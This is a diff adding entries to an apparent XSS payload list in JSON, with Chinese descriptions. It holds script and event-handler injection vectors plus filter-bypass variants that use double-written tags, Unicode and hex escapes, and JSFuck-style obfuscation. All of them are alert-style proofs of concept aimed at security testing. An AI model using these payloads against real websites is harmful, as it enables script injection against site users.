+  },
+  {
+    "name": "VIDEO onloadstart事件",
+    "code": "<video src=\"http://www.w3schools.com/html5/movie.ogg\" onloadstart=\"alert(1)\" />",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "video标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "AUDIO onloadstart事件",
+    "code": "<audio src=\"http://www.w3schools.com/html5/movie.ogg\" onloadstart=\"alert(1)\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "audio标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "AUDIO onloadstart事件",
+    "code": "<audio src=\"http://www.w3schools.com/html5/movie.ogg\" onloadstart=\"alert(1)\"></audio>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "audio标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "BODY onscroll事件",
+    "code": "<body onscroll=alert(26)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "body标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "INPUT onclick事件",
+    "code": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(/xss/)\">",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "high",
+    "tags": [
+      "INPUT标签",
+      "事件处理器"
+    ],
+    "category": "事件处理器"
+  },
+  {
+    "name": "Script外部引用",
+    "code": "<script src=\"http://baidu.com\"></script><script>Function(atob('YWxlcnQoInhzcyIp'))()</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "medium",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert(\"XSS\")</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<scr<script>ipt>alert(\"XSS\")</scr<script>ipt>",
+    "desc": "双写绕过绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "XSS向量"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert(/1/.source)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert(1);</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>prompt(1);</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>confirm(1);</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert(/88199/)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert(`a`)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert('a')</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script eval执行",
+    "code": "<script>eval(alert(1))</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "eval"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script eval执行",
+    "code": "<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 50, 51, 41))</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "eval"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script eval执行",
+    "code": "<script>eval(\"\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029\")</script>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "Unicode编码",
+      "eval"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script eval执行",
+    "code": "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29')</script>",
+    "desc": "十六进制编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "十六进制编码",
+      "eval"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script setTimeout",
+    "code": "<script>setTimeout('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29')</script>",
+    "desc": "十六进制编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "十六进制编码"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script setTimeout",
+    "code": "<script>setTimeout(alert(1),0)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script setTimeout",
+    "code": "<script>setTimeout`alert\\x28\\x27 xss \\x27\\x29`</script>",
+    "desc": "十六进制编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "十六进制编码"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script setInterval",
+    "code": "<script>setInterval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29')</script>",
+    "desc": "十六进制编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "十六进制编码"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script外部引用",
+    "code": "<script src=data:text/javascript,alert(1)></script>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "script标签",
+      "Data URI"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script外部引用",
+    "code": "<script src=&#100&#97&#116&#97:text/javascript,alert(1)></script>",
+    "desc": "空白字符绕过绕过过滤。",
+    "level": "medium",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(123)</script>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "Unicode编码"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "Unicode编码"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>\\u0061\\u006C\\u0065\\u0072\\u0074`a`</script>",
+    "desc": "Unicode编码绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签",
+      "Unicode编码"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>window['alert'](0)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>parent['alert'](1)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>self['alert'](2)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>top['alert'](3)</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<!--[if]><script>alert(1)</script     -->",
+    "desc": "注释混淆绕过过滤。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>alert(\"xss\");;;;;;;;;;;;;;;;;    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\"\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\"+$.___+\")\"+\"\\\"\")())();</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  },
+  {
+    "name": "Script标签执行",
+    "code": "<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>",
+    "desc": "XSS攻击向量，用于测试跨站脚本漏洞。",
+    "level": "critical",
+    "tags": [
+      "script标签"
+    ],
+    "category": "Script标签"
+  }
+]
